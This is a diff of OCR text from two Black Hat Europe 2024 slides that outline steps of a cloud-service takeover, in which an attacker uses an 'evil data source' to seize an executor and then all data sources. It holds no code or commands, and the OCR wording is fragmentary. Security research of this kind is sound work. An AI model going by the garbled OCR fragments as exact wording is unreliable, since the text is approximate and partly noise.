 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 4.1 Take over cloud services
 Step 3: Take over the Executor
-<a
-——_
-——_
-Ga
 UserA ee Data Source A
-} —--) ayy Ga
-Gea
 User B Config Service Executor Data Source B
-<F —
-We cama
-amas
 Attacker Evil Data Source
 (MySQL, Kafka, etc)
 ```
@@ -2395,22 +2171,17 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 4.1 Take over cloud services
 Step 4: Take over all the data sources
 a
 Cloud Service
-2.)
 User B \eo Executor
-@
 Attacker Evil Data Source
 (MySQL, Kafka, etc)
-Information Classification: General
 ```
 
 ## Slide 116
